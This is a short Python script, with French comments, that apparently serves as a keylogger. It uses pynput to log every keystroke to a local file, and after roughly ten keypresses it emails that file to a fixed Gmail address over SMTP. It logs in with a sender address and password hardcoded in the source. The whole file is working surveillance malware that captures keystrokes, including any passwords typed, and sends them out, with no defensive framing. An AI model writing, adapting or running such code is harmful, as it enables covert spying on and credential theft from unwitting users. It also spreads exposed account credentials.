from pynput.keyboard import Listener
import logging
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

i = 4
file = "touch.txt"
logging.basicConfig(filename=file, level=logging.DEBUG, format="%(asctime)s %(message)s")

#fonction de l'envoie du mail
def envoie():
    
    #info à renseigner
    sender_email = "castelpolo20@gmail.com"
    password = "pingoin6"
    receiver_email = "leopoldcastelgay@gmail.com"

    
    msg = MIMEMultipart()
    msg['Subject'] = '[Mail Python]'
    msg['From'] = sender_email
    msg['To'] = receiver_email
    
    msgText = MIMEText('<b>Voici le fichier!:</b>', 'html')
    msg.attach(msgText)
    
    filename = "touch.txt"
    msg.attach(MIMEText(open(filename).read()))

    try:
        
        with smtplib.SMTP('smtp.gmail.com', 587) as smtpObj:
            
            smtpObj.ehlo()
            smtpObj.starttls()
            smtpObj.login(sender_email, password)
            smtpObj.sendmail(sender_email, receiver_email, msg.as_string())
    except:
        print("error!: action échouée")

def on_press(key):
    logging.info(key)
    print(key)
    compte()

#ajoute 1 à i lorsque une lettre est taper
def compte():
    global i, envoie
    i = i+1

    #si le nombre de caractère taper est égale ou sup a se qui est indiquer
    if i >= 10:
        print("envoi!!")
        envoie()
    

with Listener(on_press=on_press) as listener:
    listener.join()
    